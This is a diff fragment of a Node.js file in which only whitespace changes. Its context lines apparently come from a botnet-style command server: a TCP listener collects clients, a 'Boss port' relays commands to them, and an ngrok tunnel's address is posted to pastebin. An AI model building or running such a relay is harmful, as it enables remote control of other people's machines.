@@ -35,7 +35,7 @@ getPublicIP();
 startPromt();
 // Start a TCP Server
 net.createServer(function (socket) {
-  
+
   socket.name = socket.remoteAddress + ":" + socket.remotePort;
   clients.push(socket);
   socket.on('data', function (data) {
@@ -78,7 +78,7 @@ net.createServer(function (socket) {
 
 //Boss port
 net.createServer(function (socket) {
-    socket.on('data', function (data) { 
+    socket.on('data', function (data) {
       sendCommand(data);
       console.log("Recived cmd from 8000\n".america);
     });
@@ -106,7 +106,7 @@ function getPublicIP() {
       return false;
       }
   });
-  
+
   //Get url and links it to port 4434, then save to pastebin
   ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
           console.log("NGrok Url:  ".green + url.blue);
